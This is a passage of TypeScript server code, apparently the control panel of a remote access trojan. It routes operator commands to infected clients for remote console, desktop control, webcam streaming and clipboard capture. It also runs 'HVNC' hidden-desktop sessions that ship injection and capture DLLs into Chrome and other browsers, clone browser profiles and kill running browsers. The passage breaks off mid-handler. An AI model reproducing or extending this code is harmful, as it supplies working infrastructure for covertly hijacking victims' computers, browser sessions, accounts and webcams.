import type { ServerWebSocket } from "bun";
import { decode as msgpackDecode, encode as msgpackEncode } from "@msgpack/msgpack";
import { v4 as uuidv4 } from "uuid";
import { existsSync, readFileSync } from "fs";
import path from "path";
import * as clientManager from "../clientManager";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { encodeMessage } from "../protocol";
import { resolveRuntimeRoot } from "./runtime-paths";
import * as sessionManager from "../sessions/sessionManager";
import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
import type { ClientInfo } from "../types";
import { canUserAccessClient } from "../users";

let _cachedInjectionDll: Uint8Array | null = null;
let _dllCachePath: string | null = null;
let _dllCacheMtimeMs: number = 0;

let _cachedCaptureDll: Uint8Array | null = null;
let _captureDllCachePath: string | null = null;
let _captureDllCacheMtimeMs: number = 0;

function getInjectionDllBytes(): Uint8Array | null {
  const runtimeRoot = resolveRuntimeRoot();
  const candidates = [
    path.resolve(runtimeRoot, "dist-clients", "HVNCInjection.x64.dll"),
    path.resolve(process.cwd(), "dist-clients", "HVNCInjection.x64.dll"),
    path.resolve(import.meta.dir, "../../dist-clients/HVNCInjection.x64.dll"),
  ];

  if (_dllCachePath) {
    try {
      const { statSync } = require("fs");
      const st = statSync(_dllCachePath);
      if (st.mtimeMs === _dllCacheMtimeMs && _cachedInjectionDll) {
        return _cachedInjectionDll;
      }
      _cachedInjectionDll = new Uint8Array(readFileSync(_dllCachePath));
      _dllCacheMtimeMs = st.mtimeMs;
      logger.info(`[hvnc] reloaded injection DLL from ${_dllCachePath} (${_cachedInjectionDll.length} bytes)`);
      return _cachedInjectionDll;
    } catch {
      _dllCachePath = null;
      _cachedInjectionDll = null;
    }
  }

  for (const dllPath of candidates) {
    if (!existsSync(dllPath)) continue;
    try {
      const { statSync } = require("fs");
      const st = statSync(dllPath);
      _cachedInjectionDll = new Uint8Array(readFileSync(dllPath));
      _dllCachePath = dllPath;
      _dllCacheMtimeMs = st.mtimeMs;
      logger.info(`[hvnc] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
      return _cachedInjectionDll;
    } catch {
      continue;
    }
  }

  logger.warn(`[hvnc] injection DLL not found. Checked: ${candidates.join(", ")}`);
  return null;
}

function getCaptureDllBytes(): Uint8Array | null {
  const runtimeRoot = resolveRuntimeRoot();
  const candidates = [
    path.resolve(runtimeRoot, "dist-clients", "HVNCCapture.x64.dll"),
    path.resolve(process.cwd(), "dist-clients", "HVNCCapture.x64.dll"),
    path.resolve(import.meta.dir, "../../dist-clients/HVNCCapture.x64.dll"),
  ];

  if (_captureDllCachePath) {
    try {
      const { statSync } = require("fs");
      const st = statSync(_captureDllCachePath);
      if (st.mtimeMs === _captureDllCacheMtimeMs && _cachedCaptureDll) {
        return _cachedCaptureDll;
      }
      _cachedCaptureDll = new Uint8Array(readFileSync(_captureDllCachePath));
      _captureDllCacheMtimeMs = st.mtimeMs;
      logger.info(`[hvnc] reloaded capture DLL from ${_captureDllCachePath} (${_cachedCaptureDll.length} bytes)`);
      return _cachedCaptureDll;
    } catch {
      _captureDllCachePath = null;
      _cachedCaptureDll = null;
    }
  }

  for (const dllPath of candidates) {
    if (!existsSync(dllPath)) continue;
    try {
      const { statSync } = require("fs");
      const st = statSync(dllPath);
      _cachedCaptureDll = new Uint8Array(readFileSync(dllPath));
      _captureDllCachePath = dllPath;
      _captureDllCacheMtimeMs = st.mtimeMs;
      logger.info(`[hvnc] loaded capture DLL from ${dllPath} (${_cachedCaptureDll.length} bytes)`);
      return _cachedCaptureDll;
    } catch {
      continue;
    }
  }

  return null;
}

function decodeViewerPayload(raw: string | ArrayBuffer | Uint8Array): any | null {
  if (typeof raw === "string") {
    try {
      return JSON.parse(raw);
    } catch {
      return null;
    }
  }
  try {
    const buf = raw instanceof Uint8Array ? raw : new Uint8Array(raw);
    return msgpackDecode(buf);
  } catch {
    return null;
  }
}

function safeSendViewer(ws: ServerWebSocket<SocketData>, payload: unknown) {
  try {
    ws.send(msgpackEncode(payload));
  } catch (err) {
    logger.error("[console] viewer send failed", err);
  }
}

function safeSendViewerFrame(ws: ServerWebSocket<SocketData>, bytes: Uint8Array, header?: any): number {
  try {
    const buf = buildViewerFrameBuffer(bytes, header);
    ws.send(buf);
    metrics.recordBytesSent(buf.length);
    return buf.length;
  } catch (err) {
    logger.error("[rd] viewer frame send failed", err);
    return 0;
  }
}

function buildViewerFrameBuffer(bytes: Uint8Array, header?: any): Uint8Array {
  const meta = new Uint8Array(8);
  meta[0] = 0x46;
  meta[1] = 0x52;
  meta[2] = 0x4d;
  meta[3] = 1;
  meta[4] = (header?.monitor ?? 0) & 0xff;
  meta[5] = (header?.fps ?? 0) & 0xff;
  const fmt = header?.format === "blocks"
    ? 2
    : header?.format === "blocks_raw"
    ? 3
    : header?.format === "h264"
    ? 4
    : 1;
  meta[6] = fmt;
  meta[7] = 0;

  const buf = new Uint8Array(8 + bytes.length);
  buf.set(meta, 0);
  buf.set(bytes, 8);
  return buf;
}

const VIEWER_BACKPRESSURE_BYTES = 2 * 1024 * 1024; // 2 MB

function broadcastFrameToViewers(
  sessions: Iterable<{ viewer: ServerWebSocket<SocketData> }>,
  buf: Uint8Array,
  header?: any,
): boolean {
  let sent = false;
  const t0 = performance.now();
  const byteLen = buf.length;
  for (const session of sessions) {
    try {
      const buffered = session.viewer.getBufferedAmount?.() ?? 0;
      if (buffered > VIEWER_BACKPRESSURE_BYTES) {
        continue;
      }
      session.viewer.send(buf);
      metrics.recordBytesSent(byteLen);
      sent = true;
    } catch (err) {
      logger.error("[rd] viewer frame send failed", err);
    }
  }
  const elapsed = performance.now() - t0;
  if (sent) {
    rdSendStats.frames += 1;
    rdSendStats.bytes += byteLen;
    rdSendStats.sendMs += elapsed;
  }
  logRdSend(header);
  return sent;
}

const rdSendStats = { lastLog: 0, frames: 0, sendMs: 0, bytes: 0 };
export const rdStreamingState = new Map<string, {
  isStreaming: boolean;
  display: number;
  quality: number;
  codec: string;
  duplication: boolean;
  maxHeight: number;
}>();
const rdInputPending = new Map<string, { clientId: string; sentAt: number; kind: string }>();
const RD_INPUT_TTL_MS = 10_000;

function pruneRdInputPending(now = Date.now()) {
  for (const [id, pending] of rdInputPending.entries()) {
    if (now - pending.sentAt > RD_INPUT_TTL_MS) {
      rdInputPending.delete(id);
    }
  }
}

function recordRdInput(commandId: string, clientId: string, kind: string) {
  pruneRdInputPending();
  rdInputPending.set(commandId, { clientId, sentAt: Date.now(), kind });
}

export function notifyRdInputLatency(commandId: string) {
  const pending = rdInputPending.get(commandId);
  if (!pending) return;
  rdInputPending.delete(commandId);

  const ms = Date.now() - pending.sentAt;
  for (const session of sessionManager.getRdSessionsForClient(pending.clientId)) {
    safeSendViewer(session.viewer, { type: "input_latency", ms, kind: pending.kind, commandId });
  }
}

function logRdSend(header?: any) {
  const now = Date.now();
  if (now - rdSendStats.lastLog < 5000) return;
  const frames = rdSendStats.frames || 1;
  const avgMs = rdSendStats.sendMs / frames;
  const avgBytes = rdSendStats.bytes / frames;
  const fpsAgent = header?.fps ?? "?";
  logger.debug(`[rd] send avg=${avgMs.toFixed(2)}ms size=${Math.round(avgBytes)}B frames=${rdSendStats.frames} agent_fps=${fpsAgent}`);
  rdSendStats.lastLog = now;
  rdSendStats.frames = 0;
  rdSendStats.sendMs = 0;
  rdSendStats.bytes = 0;
}

function sendConsoleCommand(target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) {
  if (!target) return false;
  try {
    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, payload, id: uuidv4() }));
    metrics.recordCommand(commandType);
    return true;
  } catch (err) {
    logger.error("[console] send command failed", err);
    return false;
  }
}

function sendDesktopCommandWithId(target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>, commandId: string) {
  if (!target) return false;
  try {
    logger.debug(`[rd] send command ${commandType} -> ${target.id}`);
    target.ws.send(encodeMessage({ type: "command", commandType: commandType as any, payload, id: commandId }));
    metrics.recordCommand(commandType);
    return true;
  } catch (err) {
    logger.error("[rd] send command failed", err);
    return false;
  }
}

export function sendDesktopCommand(target: ClientInfo | undefined, commandType: string, payload: Record<string, unknown>) {
  return sendDesktopCommandWithId(target, commandType, payload, uuidv4());
}

function startConsoleForViewer(target: ClientInfo | undefined, sessionId: string, cols = 120, rows = 36) {
  return sendConsoleCommand(target, "console_start", { sessionId, cols, rows });
}

export function stopConsoleOnTarget(target: ClientInfo | undefined, sessionId: string) {
  return sendConsoleCommand(target, "console_stop", { sessionId });
}

export function notifyConsoleClosed(clientId: string, reason: string) {
  for (const session of sessionManager.getConsoleSessionsByClient(clientId)) {
    safeSendViewer(session.viewer, { type: "status", status: "closed", reason, sessionId: session.id });
    sessionManager.deleteConsoleSession(session.id);
  }
}

export function handleConsoleViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, sessionId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const effectiveSessionId = sessionId || uuidv4();
  ws.data.sessionId = effectiveSessionId;
  const target = clientManager.getClient(clientId);
  const session: ConsoleSession = { id: effectiveSessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addConsoleSession(session);
  safeSendViewer(ws, {
    type: "ready",
    sessionId: effectiveSessionId,
    clientId,
    clientOnline: !!target,
    host: target?.host || clientId,
    os: target?.os,
    user: target?.user,
  });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId: effectiveSessionId });
    return;
  }
  startConsoleForViewer(target, effectiveSessionId);
}

export function handleRemoteDesktopViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  ws.data.sessionId = sessionId;
  const target = clientManager.getClient(clientId);
  const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addRdSession(session);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
    return;
  }
  safeSendViewer(ws, { type: "status", status: "online", sessionId });
}

export function notifyRemoteDesktopStatus(clientId: string, status: string, reason?: string) {
  for (const session of sessionManager.getRdSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, {
      type: "status",
      status,
      reason,
      sessionId: session.id,
    });
  }
}

export function handleRemoteDesktopViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload) return;
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0 };

  logger.debug(`[rd] inbound viewer msg type=${payload.type} client=${clientId}`);
  switch (payload.type) {
    case "desktop_start":
      if (!state.isStreaming) {
        if (target.os === "darwin" && target.permissions) {
          const missing: string[] = [];
          if (!target.permissions.screenRecording) missing.push("screenRecording");
          if (!target.permissions.accessibility) missing.push("accessibility");
          if (missing.length > 0) {
            logger.info(`[rd] macOS permission gate: client ${clientId} missing ${missing.join(", ")}`);
            safeSendViewer(ws, {
              type: "status",
              status: "permissions_denied",
              missing,
              permissions: target.permissions,
            });
            break;
          }
        }
        sendDesktopCommand(target, "desktop_start", {});
        state.isStreaming = true;
        rdStreamingState.set(clientId, state);
        logger.debug(`[rd] started streaming for client ${clientId}`);
      } else {
        logger.debug(`[rd] ignoring duplicate desktop_start for client ${clientId}`);
      }
      break;
    case "desktop_stop": {
      const otherViewers = sessionManager.getRdSessionsForClient(clientId)
        .filter(s => s.id !== ws.data.sessionId);
      if (otherViewers.length === 0) {
        sendDesktopCommand(target, "desktop_stop", {});
        if (state.isStreaming) {
          state.isStreaming = false;
          rdStreamingState.set(clientId, state);
          logger.debug(`[rd] stopped streaming for client ${clientId}`);
        } else {
          rdStreamingState.set(clientId, { ...state, isStreaming: false });
          logger.debug(`[rd] stop requested while not streaming for client ${clientId}`);
        }
      } else {
        logger.debug(`[rd] ignoring desktop_stop for client ${clientId} - ${otherViewers.length} other viewer(s) still active`);
      }
      break;
    }
    case "desktop_select_display": {
      const newDisplay = Number(payload.display) || 0;
      if (state.display !== newDisplay) {
        logger.debug(`[rd] changing display from ${state.display} to ${newDisplay}`);
        sendDesktopCommand(target, "desktop_select_display", { display: newDisplay });
        state.display = newDisplay;
        rdStreamingState.set(clientId, state);
      } else {
        logger.debug(`[rd] ignoring duplicate display select ${newDisplay}`);
      }
      break;
    }
    case "desktop_set_quality": {
      const newQuality = Number(payload.quality) || 90;
      const newCodec = String(payload.codec || "").toLowerCase();
      const reason = typeof payload.reason === "string"
        ? payload.reason.slice(0, 512)
        : "";
      const source = typeof payload.source === "string"
        ? payload.source.slice(0, 128)
        : "";
      if (state.quality !== newQuality || state.codec !== newCodec) {
        sendDesktopCommand(target, "desktop_set_quality", {
          quality: newQuality,
          codec: newCodec,
          ...(reason ? { reason } : {}),
          ...(source ? { source } : {}),
        });
        state.quality = newQuality;
        state.codec = newCodec;
        rdStreamingState.set(clientId, state);
        logger.debug(`[rd] set quality=${newQuality} codec=${newCodec || "(default)"}${source ? ` source=${source}` : ""}${reason ? ` reason=${reason}` : ""}`);
      }
      break;
    }
    case "desktop_enable_mouse":
      sendDesktopCommand(target, "desktop_enable_mouse", { enabled: !!payload.enabled });
      break;
    case "desktop_enable_keyboard":
      sendDesktopCommand(target, "desktop_enable_keyboard", { enabled: !!payload.enabled });
      break;
    case "desktop_enable_cursor":
      sendDesktopCommand(target, "desktop_enable_cursor", { enabled: !!payload.enabled });
      break;
    case "desktop_set_resolution": {
      const newMaxHeight = Number(payload.maxHeight) || 0;
      if (state.maxHeight !== newMaxHeight) {
        sendDesktopCommand(target, "desktop_set_resolution", { maxHeight: newMaxHeight });
        state.maxHeight = newMaxHeight;
        rdStreamingState.set(clientId, state);
        logger.debug(`[rd] set max resolution height=${newMaxHeight}`);
      }
      break;
    }
    case "desktop_set_duplication": {
      const enabled = !!payload.enabled;
      if (state.duplication !== enabled) {
        sendDesktopCommand(target, "desktop_set_duplication", { enabled });
        state.duplication = enabled;
        rdStreamingState.set(clientId, state);
        logger.debug(`[rd] set duplication to ${enabled}`);
      }
      break;
    }
    case "mouse_move": {
      if (!state.isStreaming) break;
      const rawX = (payload as any).x;
      const rawY = (payload as any).y;
      const commandId = uuidv4();
      recordRdInput(commandId, clientId, "mouse_move");
      sendDesktopCommandWithId(target, "desktop_mouse_move", { x: Number(rawX) || 0, y: Number(rawY) || 0 }, commandId);
      break;
    }
    case "mouse_down": {
      if (!state.isStreaming) break;
      const commandId = uuidv4();
      recordRdInput(commandId, clientId, "mouse_down");
      sendDesktopCommandWithId(target, "desktop_mouse_down", { button: Number(payload.button) || 0 }, commandId);
      break;
    }
    case "mouse_up": {
      if (!state.isStreaming) break;
      const commandId = uuidv4();
      recordRdInput(commandId, clientId, "mouse_up");
      sendDesktopCommandWithId(target, "desktop_mouse_up", { button: Number(payload.button) || 0 }, commandId);
      break;
    }
    case "key_down": {
      if (!state.isStreaming) break;
      const commandId = uuidv4();
      recordRdInput(commandId, clientId, "key_down");
      sendDesktopCommandWithId(target, "desktop_key_down", { key: payload.key || "", code: payload.code || "" }, commandId);
      break;
    }
    case "key_up": {
      if (!state.isStreaming) break;
      const commandId = uuidv4();
      recordRdInput(commandId, clientId, "key_up");
      sendDesktopCommandWithId(target, "desktop_key_up", { key: payload.key || "", code: payload.code || "" }, commandId);
      break;
    }
    case "text_input": {
      if (!state.isStreaming) break;
      const commandId = uuidv4();
      recordRdInput(commandId, clientId, "text_input");
      sendDesktopCommandWithId(target, "desktop_text", { text: payload.text || "" }, commandId);
      break;
    }
    case "clipboard_sync": {
      if (!state.isStreaming) break;
      const text = String(payload.text || "");
      if (text) {
        sendDesktopCommand(target, "clipboard_set", { text });
      }
      break;
    }
    case "clipboard_sync_start": {
      if (!state.isStreaming) break;
      sendDesktopCommand(target, "clipboard_sync_start", { source: "rd" });
      break;
    }
    case "clipboard_sync_stop": {
      sendDesktopCommand(target, "clipboard_sync_stop", {});
      break;
    }
    default:
      break;
  }
}

function handleRemoteDesktopFrame(payload: any) {
  const clientId = payload.clientId as string;
  const header = payload.header;
  const bytes = payload.data as Uint8Array;
  const state = rdStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "", duplication: false, maxHeight: 0 };
  if (!state.isStreaming) {
    rdStreamingState.set(clientId, { ...state, isStreaming: true });
  }
  const buf = buildViewerFrameBuffer(bytes, header);
  broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
}

(globalThis as any).__rdBroadcast = (clientId: string, bytes: Uint8Array, header?: any): boolean => {
  const buf = buildViewerFrameBuffer(bytes, header);
  return broadcastFrameToViewers(sessionManager.getRdSessionsForClient(clientId), buf, header);
};

export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();

export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  ws.data.sessionId = sessionId;
  const target = clientManager.getClient(clientId);
  const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addWebcamSession(session);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
    return;
  }
  safeSendViewer(ws, { type: "status", status: "online", sessionId });
  sendDesktopCommand(target, "webcam_list", {});
}

export function handleWebcamDevices(clientId: string, payload: any) {
  for (const session of sessionManager.getWebcamSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, payload);
  }
}

export function handleHVNCCloneProgress(clientId: string, payload: any) {
  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, {
      type: "hvnc_clone_progress",
      browser: String(payload.browser || ""),
      percent: Number(payload.percent) || 0,
      copiedBytes: Number(payload.copiedBytes) || 0,
      totalBytes: Number(payload.totalBytes) || 0,
      status: String(payload.status || ""),
    });
  }
}

export function handleHVNCLookupResult(clientId: string, payload: any) {
  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, {
      type: "hvnc_lookup_result",
      exe: String(payload.exe || ""),
      path: String(payload.path || ""),
      done: !!payload.done,
    });
  }
}

export function handleHVNCBrowserCheckResult(clientId: string, payload: any) {
  const browsers: Record<string, boolean> = {};
  if (payload.browsers && typeof payload.browsers === "object") {
    for (const [key, val] of Object.entries(payload.browsers)) {
      browsers[key] = !!val;
    }
  }
  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, {
      type: "hvnc_browser_check_result",
      browsers,
    });
  }
}

export function handleHVNCDXGIStatus(clientId: string, payload: any) {
  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, {
      type: "hvnc_dxgi_status",
      success: !!payload.success,
      gpuPid: Number(payload.gpuPid) || 0,
      message: String(payload.message || ""),
    });
  }
}

export function handleClipboardContent(clientId: string, payload: any) {
  const text = String(payload.text || "");
  const source = String(payload.source || "");
  if (!text) return;
  if (source === "hvnc") {
    for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
      safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
    }
  } else {
    for (const session of sessionManager.getRdSessionsForClient(clientId)) {
      safeSendViewer(session.viewer, { type: "clipboard_content", text, source });
    }
  }
}

export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false, quality: 90, codec: "" };
  switch (payload.type) {
    case "webcam_list":
      sendDesktopCommand(target, "webcam_list", {});
      break;
    case "webcam_select": {
      const index = Math.max(0, Number(payload.index) || 0);
      state.deviceIndex = index;
      webcamStreamingState.set(clientId, state);
      sendDesktopCommand(target, "webcam_select", { index });
      if (state.isStreaming) {
        sendDesktopCommand(target, "webcam_stop", {});
        sendDesktopCommand(target, "webcam_start", {});
      }
      break;
    }
    case "webcam_set_fps": {
      if (state.isStreaming) {
        safeSendViewer(ws, { type: "status", status: "error", reason: "Stop stream before changing FPS" });
        break;
      }
      const fps = Math.max(1, Math.min(120, Number(payload.fps) || 30));
      const useMax = !!payload.useMax;
      state.fps = fps;
      state.useMax = useMax;
      webcamStreamingState.set(clientId, state);
      sendDesktopCommand(target, "webcam_set_fps", { fps, useMax });
      break;
    }
    case "webcam_start":
      if (!state.isStreaming) {
        sendDesktopCommand(target, "webcam_set_fps", { fps: state.fps, useMax: state.useMax });
        sendDesktopCommand(target, "webcam_set_quality", { quality: state.quality, codec: state.codec });
        sendDesktopCommand(target, "webcam_start", {});
        state.isStreaming = true;
        webcamStreamingState.set(clientId, state);
      }
      break;
    case "webcam_set_quality": {
      const quality = Math.max(0, Math.min(100, Number(payload.quality) || 0));
      const codec = String(payload.codec || "").toLowerCase();
      state.quality = quality;
      state.codec = codec;
      webcamStreamingState.set(clientId, state);
      sendDesktopCommand(target, "webcam_set_quality", { quality, codec });
      break;
    }
    case "webcam_stop": {
      const otherWebcamViewers = sessionManager.getWebcamSessionsForClient(clientId)
        .filter(s => s.id !== ws.data.sessionId);
      if (otherWebcamViewers.length === 0) {
        sendDesktopCommand(target, "webcam_stop", {});
        state.isStreaming = false;
        webcamStreamingState.set(clientId, state);
      } else {
        logger.debug(`[webcam] ignoring webcam_stop for client ${clientId} - ${otherWebcamViewers.length} other viewer(s) still active`);
      }
      break;
    }
    default:
      break;
  }
}

export function handleHVNCViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  ws.data.sessionId = sessionId;
  const target = clientManager.getClient(clientId);
  const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addHvncSession(session);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
    return;
  }
  safeSendViewer(ws, { type: "status", status: "connecting", sessionId });
}

function notifyHVNCStatus(clientId: string, status: string, reason?: string) {
  for (const session of sessionManager.getHvncSessionsForClient(clientId)) {
    safeSendViewer(session.viewer, {
      type: "status",
      status,
      reason,
      sessionId: session.id,
    });
  }
}

export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload) return;
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const state = hvncStreamingState.get(clientId) || { isStreaming: false, display: 0, quality: 90, codec: "" };

  logger.debug(`[hvnc] inbound viewer msg type=${payload.type} client=${clientId}`);
  switch (payload.type) {
    case "hvnc_start":
      if (!state.isStreaming) {
        sendHVNCCommand(target, "hvnc_start", {
          autoStartExplorer: false,
        });
        state.isStreaming = true;
        hvncStreamingState.set(clientId, state);
        logger.debug(`[hvnc] started streaming for client ${clientId}`);
      } else {
        logger.debug(`[hvnc] ignoring duplicate hvnc_start for client ${clientId}`);
      }
      break;
    case "hvnc_stop": {
      const otherHvncViewers = sessionManager.getHvncSessionsForClient(clientId)
        .filter(s => s.id !== ws.data.sessionId);
      if (otherHvncViewers.length === 0) {
        if (state.isStreaming) {
          sendHVNCCommand(target, "hvnc_stop", {});
          state.isStreaming = false;
          hvncStreamingState.set(clientId, state);
          logger.debug(`[hvnc] stopped streaming for client ${clientId}`);
        }
      } else {
        logger.debug(`[hvnc] ignoring hvnc_stop for client ${clientId} - ${otherHvncViewers.length} other viewer(s) still active`);
      }
      break;
    }
    case "hvnc_select_display": {
      const newDisplay = Number(payload.display) || 0;
      if (state.display !== newDisplay) {
        logger.debug(`[hvnc] changing display from ${state.display} to ${newDisplay}`);
        sendHVNCCommand(target, "hvnc_select_display", { display: newDisplay });
        state.display = newDisplay;
        hvncStreamingState.set(clientId, state);
      } else {
        logger.debug(`[hvnc] ignoring duplicate display select ${newDisplay}`);
      }
      break;
    }
    case "hvnc_set_quality": {
      const newQuality = Number(payload.quality) || 90;
      const newCodec = String(payload.codec || "").toLowerCase();
      if (state.quality !== newQuality || state.codec !== newCodec) {
        sendHVNCCommand(target, "hvnc_set_quality", { quality: newQuality, codec: newCodec });
        state.quality = newQuality;
        state.codec = newCodec;
        hvncStreamingState.set(clientId, state);
        logger.debug(`[hvnc] set quality=${newQuality} codec=${newCodec || "(default)"}`);
      }
      break;
    }
    case "hvnc_enable_mouse":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_mouse", { enabled: !!payload.enabled });
      break;
    case "hvnc_enable_keyboard":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_keyboard", { enabled: !!payload.enabled });
      break;
    case "hvnc_enable_cursor":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_cursor", { enabled: !!payload.enabled });
      break;
    case "hvnc_enable_dxgi":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_enable_dxgi", { enabled: !!payload.enabled });
      break;
    case "hvnc_set_resolution": {
      const maxHeight = Number(payload.maxHeight) || 0;
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_set_resolution", { maxHeight });
      break;
    }
    case "hvnc_mouse_move":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_move", { x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
      break;
    case "hvnc_mouse_down":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_down", {
        button: Number(payload.button) || 0,
        x: Number(payload.x) || 0,
        y: Number(payload.y) || 0,
      });
      break;
    case "hvnc_mouse_up":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_up", {
        button: Number(payload.button) || 0,
        x: Number(payload.x) || 0,
        y: Number(payload.y) || 0,
      });
      break;
    case "hvnc_mouse_wheel":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_mouse_wheel", { delta: Number(payload.delta) || 0, x: Number(payload.x) || 0, y: Number(payload.y) || 0 });
      break;
    case "hvnc_key_down":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_down", { key: payload.key || "", code: payload.code || "" });
      break;
    case "hvnc_key_up":
      if (state.isStreaming) sendHVNCCommand(target, "hvnc_key_up", { key: payload.key || "", code: payload.code || "" });
      break;
    case "hvnc_lookup":
      sendHVNCCommand(target, "hvnc_lookup", { exe: String(payload.exe || "") });
      break;
    case "hvnc_browser_check":
      sendHVNCCommand(target, "hvnc_browser_check", {});
      break;
    case "hvnc_start_process":
      sendHVNCCommand(target, "hvnc_start_process", {
        path: String(payload.path || ""),
        kill_exe: String(payload.kill_exe || ""),
        opera_patch: Boolean(payload.opera_patch),
      });
      break;
    case "hvnc_start_process_injected": {
      const dllData = getInjectionDllBytes();
      if (!dllData) {
        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_process_injected");
        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
        break;
      }
      const captureDll = getCaptureDllBytes();
      const cmdPayload: Record<string, any> = {
        path: String(payload.path || ""),
        search_path: String(payload.search_path || ""),
        replace_path: String(payload.replace_path || ""),
        dll: dllData,
      };
      if (captureDll) cmdPayload.capture_dll = captureDll;
      sendHVNCCommand(target, "hvnc_start_process_injected", cmdPayload);
      break;
    }
    case "hvnc_start_chrome_injected": {
      const dllData = getInjectionDllBytes();
      if (!dllData) {
        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_chrome_injected");
        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
        break;
      }
      const captureDllChrome = getCaptureDllBytes();
      const chromeCmdPayload: Record<string, any> = {
        path: String(payload.path || ""),
        dll: dllData,
      };
      if (captureDllChrome) chromeCmdPayload.capture_dll = captureDllChrome;
      sendHVNCCommand(target, "hvnc_start_chrome_injected", chromeCmdPayload);
      break;
    }
    case "hvnc_start_browser_injected": {
      const dllData = getInjectionDllBytes();
      if (!dllData) {
        logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_browser_injected");
        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
        break;
      }
      const captureDllBrowser = getCaptureDllBytes();
      const browserCmdPayload: Record<string, any> = {
        browser: String(payload.browser || ""),
        path: String(payload.path || ""),
        clone: payload.clone !== false,
        cloneLite: payload.cloneLite === true,
        killIfRunning: payload.killIfRunning === true,
        dll: dllData,
      };
